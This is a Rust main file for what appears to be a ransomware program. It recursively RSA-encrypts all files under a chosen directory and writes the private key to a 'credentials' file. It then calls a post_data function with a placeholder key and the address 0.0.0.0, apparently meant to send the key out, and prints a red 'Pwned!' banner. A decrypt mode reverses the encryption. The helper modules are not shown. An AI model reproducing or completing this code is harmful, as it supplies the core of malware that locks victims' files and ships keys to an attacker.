mod cyp;
mod net;
use crate::cyp::cyp::*;
use crate::net::net::*;
use colored::*;
use std::path::Path;
use getopt::Opt;
//mod smtp;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let mut opts = getopt::Parser::new(&args, "der");

    let mut enc = false;
    let mut dec = false;
    let mut root = String::from("trash");

    loop {
        match opts.next().transpose()? {
            None => break,
                 Some(opt) => match opt {
                     Opt('d', None) => dec = true,
                     Opt('e', None) => enc = true,
                     Opt('r', Some(filename)) => root = filename.clone(),
                     _ => unreachable!(),
                 }
        }
    }

    if enc {
        let mut cyph = rsa_head();
        let _ = cyp_dirs(Path::new(&root), rsa_enc, &mut cyph)?;
        save_priv_key(cyph, "credentials")?;
        post_data("dummy key", "0.0.0.0").await?;
        println!("{}", "  
    ____                                ____
   / __ \\____ __      ______  ___  ____/ / /
  / /_/ / __ `/ | /| / / __ \\/ _ \\/ __  / / 
 / ____/ /_/ /| |/ |/ / / / /  __/ /_/ /_/  
/_/    \\__,_/ |__/|__/_/ /_/\\___/\\__,_(_) ".red());

    }

    if dec {
        let mut cyph = get_cypher("credentials")?;
        let _ = cyp_dirs(Path::new(&root), rsa_dec, &mut cyph)?;
    }
        Ok(())
}
